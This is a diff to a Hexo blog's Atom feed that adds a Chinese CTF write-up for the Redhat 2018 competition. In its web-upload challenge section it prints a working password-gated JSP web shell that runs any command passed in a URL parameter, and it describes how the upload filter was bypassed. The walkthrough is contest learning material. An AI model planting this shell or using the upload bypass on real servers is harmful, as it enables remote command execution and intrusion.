@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-04-26T13:23:30.950Z</updated>
+  <updated>2018-04-30T03:49:32.311Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Redhat2018 WP</title>
+    <link href="http://yoursite.com/2018/04/30/Redhat/"/>
+    <id>http://yoursite.com/2018/04/30/Redhat/</id>
+    <published>2018-04-30T03:19:14.000Z</published>
+    <updated>2018-04-30T03:49:32.311Z</updated>
+    
+    <content type="html"><![CDATA[<p>国赛打完又是redhat~不过国赛辣鸡赛制让我们白打了（小声吐槽一波游戏体验极差的国赛）<br>1.Misc 签到<br>看管理员名片（后来直接在群里放出）<br><code>签到题的flag为 flag{redhat_welcome}</code></p><p>2.Web<br>simple upload<br>打开是个登录页面，可题目说是上传，于是扫一下目录，发现有upload.html<br>打开果然是上传<br>随便传一个文件发现文件发现没有回显，于是打开BP抓一下包，可能需要改一下类型<br>先开始可能是没睡醒、、一直传php的马，结果被学长一语点醒。。。。这就是不是php网页你搞什么php<br>然后试一下报错页面，会看到服务器信息<br><img src="/2018/04/30/Redhat/报错.jpg" alt=" "><br>搜一下发现有一些CVE，可是没什么利用的，所以还是上传问题，想了半天也不知道网站后端用啥写的、、怕是经验太少了<br>后来百度突然发现Tomcat大部分都是java写的，然后百度各种jsp马及利用方法，终于找到了一个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><br>然后生成.jsp木马<br>打开BP上传，改一下admin为真，类型怕有过滤，改成image/png最保险~<br>如图<br><img src="/2018/04/30/Redhat/BP.jpg" alt=" "><br>然后现在得到了上传的地址。。。菜刀连一下发现菜刀没有jsp马这个选项、、然后上hackbar<br>百度jsp马使用规则<br>最后构造payload为：<br><code>http://65cc56140bdb44689b8c18dadbf9ff4d5f9ecd2f609a47ce.game.ichunqiu.com/1c0737e7-081a-4aab-94ea-5820e4e250bc/muma.jsp?pwd=023&amp;i=pwd</code><br>打开如下<br><img src="/2018/04/30/Redhat/root.jpg" alt=" "><br>发现可以读文件，后面又考察了linux系统一些基本操作（结果我有点菜hhh~）<br>然后改一下i为../ls可以读出文件列表<br>然后读一下flag文件<br><code>http://65cc56140bdb44689b8c18dadbf9ff4d5f9ecd2f609a47ce.game.ichunqiu.com/1c0737e7-081a-4aab-94ea-5820e4e250bc/muma.jsp?pwd=023&amp;i=cat /flag</code><br>得到flag<br><code>flag{bdfa6be5-b026-4a90-8fbd-17f9df63cba3}</code></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;国赛打完又是redhat~不过国赛辣鸡赛制让我们白打了（小声吐槽一波游戏体验极差的国赛）&lt;br&gt;1.Misc 签到&lt;br&gt;看管理员名片（后来直接在群里放出）&lt;br&gt;&lt;code&gt;签到题的flag为 flag{redhat_welcome}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;2.We
+      
+    
+    </summary>
+    
+    
+      <category term="日益成长的小白" scheme="http://yoursite.com/tags/%E6%97%A5%E7%9B%8A%E6%88%90%E9%95%BF%E7%9A%84%E5%B0%8F%E7%99%BD/"/>
+    
+  </entry>
   
   <entry>
     <title>怎么在优酷下载视频不用VIP，不用客户端</title>
